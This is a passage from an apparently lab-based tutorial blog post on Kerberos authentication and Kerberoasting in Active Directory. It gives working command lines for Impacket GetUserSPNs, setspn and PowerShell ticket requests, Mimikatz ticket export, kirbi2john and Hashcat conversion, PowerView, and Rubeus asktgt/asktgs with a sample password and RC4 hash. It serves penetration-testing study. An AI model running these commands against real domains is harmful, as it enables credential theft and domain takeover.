key</em></li>\n<li><em>Username</em></li>\n<li><em>Timestamp</em></li>\n<li><em>TGT</em></li>\n<li><em>SPN of requested service e.g. SQL service</em></li>\n</ul>\n<p><strong>Step 4:</strong> The KDC receives the KRB_TGS_REQ message and decrypts the message using Krbtgt hash to verify TGT (Unlock using Yellow key), then KDC returns a TGS as KRB_TGS_REP which is encrypted using requested service hash <strong>(Locked with Red Key)</strong> &amp; Some Encrypted Message using User Hash.</p>\n<p><em><strong>KRB_TGS_REP contains:</strong></em></p>\n<ul>\n<li><em>Username</em></li>\n<li><em>Encrypted data with the session key:</em></li>\n<li><em>Service session key</em></li>\n<li><em>The expiration date of TGS</em></li>\n<li><em><strong>TGS</strong>, (Service Hash: RED Key) which contains:</em></li>\n<li><em>Service session key</em></li>\n<li><em>Username</em></li>\n<li><em>The expiration date of TGS</em></li>\n<li><em>PAC with user privileges, signed by KDC</em></li>\n</ul>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEljfKE_fFEoR8kThrILtnjmFwQPfM61p-SZh6Xg64sLUv7GzLgsvk6Ni5YhC8A7ILETnBFHbsa2ldkL6u1mrWGkDStzkFSP9oCeg3cO_9QxjyltM0ZpKm5Jf2oV8lo-IsfR2C7-jAAaRyWTu_Sofn4TV7BhIl0fj5fYPIicSjbScOtyUql25EmTo-Tw/s16000/3.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEljfKE_fFEoR8kThrILtnjmFwQPfM61p-SZh6Xg64sLUv7GzLgsvk6Ni5YhC8A7ILETnBFHbsa2ldkL6u1mrWGkDStzkFSP9oCeg3cO_9QxjyltM0ZpKm5Jf2oV8lo-IsfR2C7-jAAaRyWTu_Sofn4TV7BhIl0fj5fYPIicSjbScOtyUql25EmTo-Tw/s16000/3.png?w=640&amp;ssl=1\"></p>\n<p><strong>Step 5:</strong> The user sends the copy of TGS to the Application Server,</p>\n<p><em><strong>KRB_AP_REQ contains:</strong></em></p>\n<ul>\n<li><em>TGS</em></li>\n<li><em>Encrypted data with the service session key:</em></li>\n<li><em>Username</em></li>\n<li><em>Timestamp, to avoid replay attacks</em></li>\n</ul>\n<p><strong>Step 6:</strong> The application attempts to decrypt the message using its NTLM hash and to verify the PAC from KDC to identify user Privilege which is an optional case.</p>\n<p><strong>Step 7:</strong>  KDC verifies PAC (Optional)</p>\n<p><strong>Step 8:</strong>  Allow the user to access the service for a specific time.</p>\n<h2 id=\"SPNs\"><a href=\"#SPNs\" class=\"headerlink\" title=\"SPNs\"></a>SPNs</h2><p>The Service Principal Name (SPN) is a unique identifier for a service instance. Active Directory Domain Services and Windows provide support for Service Principal Names (SPNs), which are key components of the Kerberos mechanism through which a client authenticates a service.</p>\n<p><strong>Important Points</strong></p>\n<ul>\n<li>If you install multiple instances of a service on computers throughout a forest, each instance must have its SPN.</li>\n<li>Before the Kerberos authentication service can use an SPN to authenticate a service, the SPN must be registered on the account.</li>\n<li>A given SPN can be registered on only one account.</li>\n<li>An SPN must be unique in the forest in which it is registered.</li>\n<li>If it is not unique, authentication will fail.</li>\n</ul>\n<h3 id=\"SPNS-syntax\"><a href=\"#SPNS-syntax\" class=\"headerlink\" title=\"SPNS syntax\"></a>SPNS syntax</h3><p><strong>The SPN syntax has four elements</strong></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5w4iPbIsIxS5VNUzD13_nOXg-0AbmhtwdJWBUqi4keSFbajcnh5Bgqro7FOj686VwDTBbtu0oYjZbBGRyRWxUHy8EAJp8jmUQpDBymwTWzE_9RIpwOkK2Ul6bxIbDZSwHYhknzECBwjBEd4VU5HyMeCciosGRPfcjbaN62fLe6WPiArdLqlHrpGMKOQ/s16000/5.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5w4iPbIsIxS5VNUzD13_nOXg-0AbmhtwdJWBUqi4keSFbajcnh5Bgqro7FOj686VwDTBbtu0oYjZbBGRyRWxUHy8EAJp8jmUQpDBymwTWzE_9RIpwOkK2Ul6bxIbDZSwHYhknzECBwjBEd4VU5HyMeCciosGRPfcjbaN62fLe6WPiArdLqlHrpGMKOQ/s16000/5.png?w=640&amp;ssl=1\"></p>\n<h3 id=\"Type-of-SPN\"><a href=\"#Type-of-SPN\" class=\"headerlink\" title=\"Type of SPN\"></a>Type of SPN</h3><ul>\n<li>Host-based SPNs which is associated with the computer account in AD, it is randomly generated 128-character long password which is changed every 30 days; hence it is no use in Kerberoasting attacks</li>\n<li>SPNs that have been associated with a domain user account where NTLM hash will be used.</li>\n</ul>\n<h3 id=\"Linux-Perspective\"><a href=\"#Linux-Perspective\" class=\"headerlink\" title=\"Linux Perspective\"></a>Linux Perspective</h3><h4 id=\"Attack-Procedure\"><a href=\"#Attack-Procedure\" class=\"headerlink\" title=\"Attack Procedure.\"></a>Attack Procedure.</h4><p>Depending on your positioning a network, Kerberos attacks can be performed in multiple ways.</p>\n<ul>\n<li>From a non-domain joined Linux host using valid domain user credentials.</li>\n<li>From a domain-joined Linux host as root after retrieving the keytab file.</li>\n<li>From a domain-joined Windows, the host is authenticated as a domain user.</li>\n<li>From a domain-joined Windows host with a shell in the context of a domain account.</li>\n<li>As SYSTEM on a domain-joined Windows host.</li>\n<li>From a non-domain joined Windows host using <a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)\">runas</a> &#x2F;netonly.</li>\n</ul>\n<h4 id=\"Tools\"><a href=\"#Tools\" class=\"headerlink\" title=\"Tools.\"></a>Tools.</h4><p>Some tools can be utilized to perform the attack.</p>\n<ul>\n<li>Impacket’s <a href=\"https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py\">GetUserSPNs.py</a> from a non-domain joined Linux host.</li>\n<li>A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.</li>\n<li>From Windows, utilizing tools such as PowerView, <a href=\"https://github.com/GhostPack/Rubeus\">Rubeus</a>, and other PowerShell scripts.</li>\n</ul>\n<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>REMEMBER!!!</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>\n<p>Obtaining a TGS ticket via kerberoasting does not guarantee a set of valid credentials and the ticket still must be cracked offline to obtain the cleartext password.</p>\n<p>TGS tickets generally take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using s standard cracking rig.</p>\n<h4 id=\"The-efficiency-of-Attack\"><a href=\"#The-efficiency-of-Attack\" class=\"headerlink\" title=\"The efficiency of Attack\"></a>The efficiency of Attack</h4><p>While it can be a great way to move lateral or escalate privileges in a domain kerberoasting and the presence of SPNs does not guarantee us any level of access.</p>\n<p>We might be in an environment where we crack a TGS ticket and obtain Domain Admin access straightway or obtain credentials that help us move down the path to domain compromise. Other times we may perform the attack and retrieve many TGS tickets, some of which we can crack, but none of the ones that crack are for privileged users, and the attack does not gain us any additional access.</p>\n<p><strong>N&#x2F;B -</strong> When writing a report this finding is termed as high-risk in the first two cases. Third case we may Kerberos and end up unable to crack a single TGS ticket even after mad days of cracking attempts with Hashcat. This would be dropped as a medium-risk issue to make the client aware of the risk of SPNs in the domain.</p>\n<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>REMEMBER!!!</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>\n<p>A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.</p>\n<h4 id=\"GetUserSPNs-py\"><a href=\"#GetUserSPNs-py\" class=\"headerlink\" title=\"GetUserSPNs.py\"></a>GetUserSPNs.py</h4><p><strong>Listing SPN Accounts.</strong></p>\n<p><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend</code></p>\n<h4 id=\"Requesting-all-TGS-tickets\"><a href=\"#Requesting-all-TGS-tickets\" class=\"headerlink\" title=\"Requesting all TGS tickets.**\"></a>Requesting all TGS tickets.**</h4><p>Later on, we can pull all TGS tickets for offline processing using the <strong>-request</strong> flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or Johnny for offline password-cracking attempts.</p>\n<p><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request</code></p>\n<h4 id=\"Requesting-a-Single-TGS-Ticket\"><a href=\"#Requesting-a-Single-TGS-Ticket\" class=\"headerlink\" title=\"Requesting a Single TGS Ticket.\"></a>Requesting a Single TGS Ticket.</h4><p>Wte can also be more targeted and request just the TGS ticket for a specific account. Let’s try requesting one for just the required account.</p>\n<p><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user</code></p>\n<p>With this ticket in hand, we could attempt, to crack the password offline, if successful we may end up with Domain Admin Rights.</p>\n<p>Saving the Ticket o facilitate offline cracking, it is always good to use the <code>-outputfile</code> flag to write the TGS tickets to a file that can then be run using Hashcat on our attack system or moved to a GPU cracking rig.</p>\n<p><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs</code></p>\n<h3 id=\"Windows-Perspective\"><a href=\"#Windows-Perspective\" class=\"headerlink\" title=\"Windows Perspective\"></a>Windows Perspective</h3><p>Kerberoasting - Semi-Manual Method.</p>\n<h4 id=\"Enumerating-SPNs-with-setspn-exe\"><a href=\"#Enumerating-SPNs-with-setspn-exe\" class=\"headerlink\" title=\"Enumerating SPNs with setspn.exe\"></a>Enumerating SPNs with setspn.exe</h4><p><code>setspn.exe -Q */*</code> running the command you’ll notice many different SPNs returned for the various hosts in the domain.</p>\n<h4 id=\"Retrieving-All-Tickets-using-setspn-exe\"><a href=\"#Retrieving-All-Tickets-using-setspn-exe\" class=\"headerlink\" title=\"Retrieving All Tickets using setspn.exe\"></a>Retrieving All Tickets using setspn.exe</h4><p><code>setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;</code></p>\n<p>The above command combines the previous command with <code>setspn.exe</code> to request tickets for all accounts with SPNs set.</p>\n<p>Using <strong><strong><strong><strong><strong><strong><strong><strong><strong>Powershell</strong></strong></strong></strong></strong></strong></strong></strong></strong> we can request TGS tickets for an account in the shell and load them into memory, once they are loaded into memory we can extract them using <strong>Mimkatz.</strong></p>\n<h4 id=\"Targeting-a-Single-User\"><a href=\"#Targeting-a-Single-User\" class=\"headerlink\" title=\"Targeting a Single User**************\"></a>Targeting a Single User**************</h4><figure class=\"highlight powershell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">PS</span> C:\\htb&gt; <span class=\"built_in\">Add-Type</span> <span class=\"literal\">-AssemblyName</span> System.IdentityModel</span><br><span class=\"line\"><span class=\"built_in\">PS</span> C:\\htb&gt; <span class=\"built_in\">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class=\"literal\">-ArgumentList</span> <span class=\"string\">&quot;MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433&quot;</span></span><br></pre></td></tr></table></figure>\n<p>Before moving on, let’s break down the commands above to see what we are doing (which is essentially what is used by <a href=\"https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1\">Rubeus</a> when using the default Kerberoasting method):</p>\n<ul>\n<li>The <a href=\"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2\">Add-Type</a> cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object</li>\n<li>The <code>AssemblyName</code> parameter allows us to specify an assembly that contains types that we are interested in using</li>\n<li><a href=\"https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8\">System.IdentityModel</a> is a namespace that contains different classes for building security token services</li>\n<li>We’ll then use the <a href=\"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2\">New-Object</a> cmdlet to create an instance of a .NET Framework object</li>\n<li>We’ll use the <a href=\"https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8\">System.IdentityModel.Tokens</a> namespace with the <a href=\"https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8\">KerberosRequestorSecurityToken</a> class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session</li>\n</ul>\n<p>We can also choose to retrieve all tickets using the same method, but this will also pull all computer accounts, so it is not optimal.</p>\n<p>Now that the tickets are loaded, we can use <code>Mimikatz</code> to extract the ticket(s) from <code>memory</code>.</p>\n<h3 id=\"Extracting-Tickets-from-Memory-with-Mimikatz\"><a href=\"#Extracting-Tickets-from-Memory-with-Mimikatz\" class=\"headerlink\" title=\"Extracting Tickets from Memory with Mimikatz\"></a>Extracting Tickets from Memory with Mimikatz</h3><figure class=\"highlight powershell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">Using</span> <span class=\"string\">&#x27;mimikatz.log&#x27;</span> for logfile : OK</span><br><span class=\"line\"></span><br><span class=\"line\">mimikatz <span class=\"comment\"># base64 /out:true</span></span><br><span class=\"line\">isBase64InterceptInput  is false</span><br><span class=\"line\">isBase64InterceptOutput is true</span><br><span class=\"line\"></span><br><span class=\"line\">mimikatz <span class=\"comment\"># kerberos::list /export</span></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;SNIP&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"number\">00000002</span>] - <span class=\"number\">0</span>x00000017 - rc4_hmac_nt</span><br><span class=\"line\">   <span class=\"built_in\">Start</span>/<span class=\"keyword\">End</span>/MaxRenew: <span class=\"number\">2</span>/<span class=\"number\">24</span>/<span class=\"number\">2022</span> <span class=\"number\">3</span>:<span class=\"number\">36</span>:<span class=\"number\">22</span> PM ; <span class=\"number\">2</span>/<span class=\"number\">25</span>/<span class=\"number\">2022</span> <span class=\"number\">12</span>:<span class=\"number\">55</span>:<span class=\"number\">25</span> AM ; <span class=\"number\">3</span>/<span class=\"number\">3</span>/<span class=\"number\">2022</span> <span class=\"number\">2</span>:<span class=\"number\">55</span>:<span class=\"number\">25</span> PM</span><br><span class=\"line\">   Server Name: MSSQLSvc/DEV<span class=\"literal\">-PRE-SQL</span>.inlanefreight.local:<span class=\"number\">1433</span> <span class=\"selector-tag\">@</span> INLANEFREIGHT.LOCAL</span><br><span class=\"line\">   Client Name: htb<span class=\"literal\">-student</span> <span class=\"selector-tag\">@</span> INLANEFREIGHT.LOCAL</span><br><span class=\"line\">   Flags <span class=\"number\">40</span>a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;</span><br><span class=\"line\">====================</span><br><span class=\"line\">Base64 of file : <span class=\"number\">2</span><span class=\"literal\">-40a10000-htb-student</span>@MSSQLSvc~DEV<span class=\"literal\">-PRE-SQL</span>.inlanefreight.local~<span class=\"number\">1433</span><span class=\"literal\">-INLANEFREIGHT</span>.LOCAL.kirbi</span><br><span class=\"line\">====================</span><br><span class=\"line\">doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgEFoRUbE0lOTEFO</span><br><span class=\"line\">RUZSRUlHSFQuTE9DQUyiOzA5oAMCAQKhMjAwGwhNU1NRTFN2YxskREVWLVBSRS1T</span><br><span class=\"line\">UUwuaW5sYW5lZnJlaWdodC5sb2NhbDoxNDMzo4IEvzCCBLugAwIBF6EDAgECooIE</span><br><span class=\"line\">rQSCBKmBMUn7JhVJpqG0ll7UnRuoeoyRtHxTS8JY1cl6z0M4QbLvJHi0JYZdx1w5</span><br><span class=\"line\">sdzn9Q3tzCn8ipeu+NUaIsVyDuYU/LZG4o2FS83CyLNiu/r2Lc2ZM8Ve/rqdd+TG</span><br><span class=\"line\">xvUkr+<span class=\"number\">5</span>caNrPy2YHKRogzfsO8UQFU1anKW4ztEB1S+f4d1SsLkhYNI4q67cnCy00</span><br><span class=\"line\">UEf4gOF6zAfieo91LDcryDpi1UII0SKIiT0yr9IQGR3TssVnl70acuNac6eCC+Uf</span><br><span class=\"line\">vyd7g9gYH/<span class=\"number\">9</span>aBc8hSBp7RizrAcN2HFCVJontEJmCfBfCk0Ex23G8UULFic1w7S6/</span><br><span class=\"line\">V9yj9iJvOyGElSk1VBRDMhC41712/sTraKRd7rw+fMkx7YdpMoU2dpEj9QQNZ3GR</span><br><span class=\"line\">XNvGyQFkZp+sctI6Yx/vJYBLXI7DloCkzClZkp7c40u+<span class=\"number\">5</span>q/xNby7smpBpLToi5No</span><br><span class=\"line\">ltRmKshJ9W19aAcb4TnPTfr2ZJcBUpf5tEza7wlsjQAlXsPmL3EF2QXQsvOc74Pb</span><br><span class=\"line\">TYEnGPlejJkSnzIHs4a0wy99V779QR4ZwhgUjRkCjrAQPWvpmuI6RU9vOwM50A0n</span><br><span class=\"line\">h580JZiTdZbK2tBorD2BWVKgU/h9h7JYR4S52DBQ7qmnxkdM3ibJD0o1RgdqQO03</span><br><span class=\"line\">TQBMRl9lRiNJnKFOnBFTgBLPAN7jFeLtREKTgiUC1/aFAi5h81aOHbJbXP5aibM4</span><br><span class=\"line\">eLbj2wXp2RrWOCD8t9BEnmat0T8e/O3dqVM52z3JGfHK/<span class=\"number\">5</span>aQ5Us+T5qM9pmKn5v1</span><br><span class=\"line\">XHou0shzgunaYPfKPCLgjMNZ8+<span class=\"number\">9</span>vRgOlry/CgwO/NgKrm8UgJuWMJ/skf9QhD0Uk</span><br><span class=\"line\">T9cUhGhbg3/pVzpTlk1UrP3n+WMCh2Tpm+p7dxOctlEyjoYuQ9iUY4KI6s6ZttT4</span><br><span class=\"line\">tmhBUNua3EMlQUO3fzLr5vvjCd3jt4MF/fD+YFBfkAC4nGfHXvbdQl4E++Ol6/LX</span><br><span class=\"line\">ihGjktgVop70jZRX+<span class=\"number\">2</span>x4DrTMB9+mjC6XBUeIlS9a2Syo0GLkpolnhgMC/ZYwF0r4</span><br><span class=\"line\">MuWZu1/KnPNB16EXaGjZBzeW3/vUjv6ZsiL0J06TBm3mRrPGDR3ZQHLdEh3QcGAk</span><br><span class=\"line\"><span class=\"number\">0</span>Rc4p16+tbeGWlUFIg0PA66m01mhfzxbZCSYmzG25S0cVYOTqjToEgT7EHN0qIhN</span><br><span class=\"line\">yxb2xZp2oAIgBP2SFzS4cZ6GlLoNf4frRvVgevTrHGgba1FA28lKnqf122rkxx+<span class=\"number\">8</span></span><br><span class=\"line\">ECSiW3esAL3FSdZjc9OQZDvo8QB5MKQSTpnU/LYXfb1WafsGFw07inXbmSgWS1Xk</span><br><span class=\"line\">VNCOd/kXsd0uZI2cfrDLK4yg7/ikTR6l/dZ+Adp5BHpKFAb3YfXjtpRM6+<span class=\"number\">1</span>FN56<span class=\"built_in\">h</span></span><br><span class=\"line\">TnoCfIQ/pAXAfIOFohAvB5Z6fLSIP0TuctSqejiycB53N0AWoBGT9bF4409M8tjq</span><br><span class=\"line\"><span class=\"number\">32</span>UeFiVp60IcdOjV4Mwan6tYpLm2O6uwnvw0J+Fmf5x3Mbyr42RZhgQKcwaSTfXm</span><br><span class=\"line\"><span class=\"number\">5</span>oZV57Di6I584CgeD1VN6C2d5sTZyNKjb85lu7M3pBUDDOHQPAD9l4Ovtd8O6Pur</span><br><span class=\"line\">+jWFIa2EXm0<span class=\"built_in\">H</span>/efTTyMR665uahGdYNiZRnpm+ZfCc9LfczUPLWxUOOcaBX/uq6OC</span><br><span class=\"line\">AQEwgf6gAwIBAKKB9gSB832B8DCB7aCB6jCB5zCB5KAbMBmgAwIBF6ESBBB3DAVi</span><br><span class=\"line\">Ys6KmIFpubCAqyQcoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiGDAWoAMCAQGhDzAN</span><br><span class=\"line\">GwtodGItc3R1ZGVudKMHAwUAQKEAAKURGA8yMDIyMDIyNDIzMzYyMlqmERgPMjAy</span><br><span class=\"line\">MjAyMjUwODU1MjVapxEYDzIwMjIwMzAzMjI1NTI1WqgVGxNJTkxBTkVGUkVJR0hU</span><br><span class=\"line\">LkxPQ0FMqTswOaADAgECoTIwMBsITVNTUUxTdmMbJERFVi1QUkUtU1FMLmlubGFu</span><br><span class=\"line\">ZWZyZWlnaHQubG9jYWw6MTQzMw==</span><br><span class=\"line\">====================</span><br><span class=\"line\"></span><br><span class=\"line\">   * Saved to file     : <span class=\"number\">2</span><span class=\"literal\">-40a10000-htb-student</span>@MSSQLSvc~DEV<span class=\"literal\">-PRE-SQL</span>.inlanefreight.local~<span class=\"number\">1433</span><span class=\"literal\">-INLANEFREIGHT</span>.LOCAL.kirbi</span><br></pre></td></tr></table></figure>\n<p>If we don’t specify the <strong>base64 &#x2F;out:true</strong> command, Mimikatz will extract the tickets and write the to <strong>.kirbi</strong> files. </p>\n<p> Next, you prepare the base blob for cracking <code>echo &quot;&lt;base64 blob&gt;&quot; |  tr -d \\\\n</code> then place the above into a file and convert it back to a <strong>.kirbi</strong> file using the base64 utility.<code>cat encoded_file | base64 -d &gt; sqldev.kirbi</code></p>\n<p> Extract the kerberos ticket using <a href=\"http://kirbi2john.py/\">kirbi2john.py</a> this will create a file called <strong>crack_file,</strong> which then must be modified to be able to use Hashcat against the hash <code>python2.7 kirbi2john.py sqldev.kirbi</code></p>\n<p>Modifying the crack file for hashcat <code>sed &#39;s/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/&#39; crack_file &gt; sqldev_tgs_hashcat</code> now you can run the ticket through hashcat and get a clear password.</p>\n<h4 id=\"Skipped-Version\"><a href=\"#Skipped-Version\" class=\"headerlink\" title=\"Skipped Version\"></a>Skipped Version</h4><p>So if we decide to skip the base64 output with mimkatz and type <strong>mimikatz # kerberos::list &#x2F;export,</strong> the <strong>.kirbi</strong> file will be written to disk, in this case, you can download the file and run <strong><a href=\"http://kirbi2john.py/\">kirbi2john.py</a></strong> against them directly, skipping the base64 decoding step.</p>\n<h4 id=\"AUTOMATE-VERSION\"><a href=\"#AUTOMATE-VERSION\" class=\"headerlink\" title=\"AUTOMATE VERSION\"></a>AUTOMATE VERSION</h4><p>Using <a href=\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1\">PowerView</a> to extract the TGS ticket and convert them to Hashcat format.</p>\n<p><strong>Extracting TGS Ticket</strong></p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">PS</span> C:\\htb&gt; <span class=\"built_in\">Import-Module</span> .\\PowerView.ps1</span><br><span class=\"line\"><span class=\"built_in\">PS</span> C:\\htb&gt; <span class=\"built_in\">Get-DomainUser</span> * <span class=\"literal\">-spn</span> | <span class=\"built_in\">select</span> samaccountname</span><br><span class=\"line\"><span class=\"built_in\">PS</span> C:\\htb&gt; <span class=\"built_in\">Get-DomainUser</span> <span class=\"literal\">-Identity</span> sqldev | <span class=\"built_in\">Get-DomainSPNTicket</span> <span class=\"literal\">-Format</span> Hashcat</span><br></pre></td></tr></table></figure>\n<p><strong>Target Specific User</strong></p>\n<p><code>Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat</code></p>\n<p><strong>Exporting All Tickets to a CSV file and viewing the Content</strong></p>\n<p><code>Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\ilfreight_tgs.csv -NoTypeInformation</code></p>\n<p><code>cat .\\ilfreight_tgs.csv</code></p>\n<h2 id=\"REBEUS\"><a href=\"#REBEUS\" class=\"headerlink\" title=\"REBEUS\"></a>REBEUS</h2><p><a href=\"https://github.com/GhostPack/Rubeus\">https://github.com/GhostPack/Rubeus</a></p>\n<p>A tool capable of performing kerberoasting faster and easier by providing a variety of options to interact with kerberos</p>\n<p><a href=\"https://www.hackingarticles.in/a-detailed-guide-on-rubeus/\">https://www.hackingarticles.in/a-detailed-guide-on-rubeus/</a></p>\n<h3 id=\"Ticket-Operations\"><a href=\"#Ticket-Operations\" class=\"headerlink\" title=\"Ticket Operations\"></a><strong>Ticket Operations</strong></h3><p>Working in an Active Directory environment depends on various tickets. For example, a Ticket Granting Ticket is an authentication token issued by the KDC which is used to request access from TGS for specific resources.</p>\n<p>In this section, we’ll talk about Rubeus and its capability to play around with tickets.</p>\n<h4 id=\"Asktgt\"><a href=\"#Asktgt\" class=\"headerlink\" title=\"Asktgt\"></a>Asktgt</h4><p>Rubeus can generate raw AS-REQ traffic in order to ask for a TGT with a provided username and password. The password can also be encrypted in RC4, AES or DES encryption and it would still work. Let’s see an example where a clear-text password is supplied</p>\n<p><code>rubeus.exe asktgt /user:harshitrajpal /password: Password@1</code></p>\n<p> <img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgoZ7cs-QGTlKd5Bzpz77QkG6O6Fi72ldE6ow6UL-XPUd9C67hSeOJi9oqI3KMjzHTeXnrzsh4gfW3_YzzHX-Vo79aphiKA-HUtp49i8dnjHouPnzQQ1Jiwjr9VToCj5KtwWhqgKICUBgw2CTYT47tQELkP85ZBab2vugzQn6WmCr5hj5uZMJ-dITJOhg/s16000/7.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgoZ7cs-QGTlKd5Bzpz77QkG6O6Fi72ldE6ow6UL-XPUd9C67hSeOJi9oqI3KMjzHTeXnrzsh4gfW3_YzzHX-Vo79aphiKA-HUtp49i8dnjHouPnzQQ1Jiwjr9VToCj5KtwWhqgKICUBgw2CTYT47tQELkP85ZBab2vugzQn6WmCr5hj5uZMJ-dITJOhg/s16000/7.png?w=640&amp;ssl=1\"></p>\n<p>As you can see above that a KRBTGT has been successfully generated which can be further used to generate TGS. The same can be achieved by providing an encrypted password. Let’s use a password encrypted with the RC4 cipher.</p>\n<p><code>rubeus.exe asktgt /user:harshitrajpal /rc4:64FBAE31CC352FC26AF97CBDEF151E03</code></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6vfMUCFomJiyWrerwcZuM3nwQpfznhLsINzT8AiGJoXTgS0g42p3tERFo0ub34PI3SLF_XLstk_lq9rrbJE4Vjq6Wfvdho0Ntfs870KbT5wB9Mxk-vHTcAht8sC4fkWmU5YV_0BkOm5ILs9gJ8Nq6euvG-wncjJMfoaTn1fc5MpmzXNXSTjmm2JPc4g/s16000/8.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6vfMUCFomJiyWrerwcZuM3nwQpfznhLsINzT8AiGJoXTgS0g42p3tERFo0ub34PI3SLF_XLstk_lq9rrbJE4Vjq6Wfvdho0Ntfs870KbT5wB9Mxk-vHTcAht8sC4fkWmU5YV_0BkOm5ILs9gJ8Nq6euvG-wncjJMfoaTn1fc5MpmzXNXSTjmm2JPc4g/s16000/8.png?w=640&amp;ssl=1\"></p>\n<p><strong>Asktgs</strong></p>\n<p>Rubeus has an asktgs option which can build raw TGS-REP requests by providing a ticket either in the CLI argument or by providing a path to a ticket.kirbi file placed on disk. Each TGS has a specified purpose.</p>\n<p>For example, let’s create a TGS for the LDAP service. One or more service SPNs can be provided.</p>\n<p><code>rubeus.exe asktgs /user:harshitrajpal /ticket:doIFNDCCBTCgAwIBB...bA== /service:LDAP/dc1.ignite.local</code><br><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMI6bD_rWmk3OnNX-A2fyRHpOAOuMB9C_79YtSoJITgwK-vMjtkrKnt8HmLMzt6zM0amwmzw8khiMatpV1CW9XCCRjp-1qhcbIWxz3yDZFfNs04v3DGllEd0ZROjkRqwd1ghVF3WbPCfx6HReUAb67OMvMV7IKrIl4zIa5oEwoIwTjRHSO5EJcNCqPIg/s16000/9.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMI6bD_rWmk3OnNX-A2fyRHpOAOuMB9C_79YtSoJITgwK-vMjtkrKnt8HmLMzt6zM0amwmzw8khiMatpV1CW9XCCRjp-1qhcbIWxz3yDZFfNs04v3DGllEd0ZROjkRqwd1ghVF3WbPCfx6HReUAb67OMvMV7IKrIl4zIa5oEwoIwTjRHSO5EJcNCqPIg/s16000/9.png?w=640&amp;ssl=1\"></p>\n<p>By providing in the TGT we generated in the previous step (copying in notepad and removing enters to type the ticket in a single line) we have generated a TGS successfully.</p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZIVjHBOo3oUV7kNLe-E4sPeFKTAwW2e0nUV2BxXFxZ2R_Bni2LUjvkiKIL6o0Ugfs_S5N2Q8f383lwlGR0ZYYEcY0VNeha3W0UHtCM8-LaYDxBDWL8GUww5gK3Bb29OUr5U5FB2trJ4h7A3hJEP6BGlNBjcmbBBnaQ2pGfA1Yq7d0REz4DLydwjMjcw/s16000/10.png?w=640&ssl=1\" 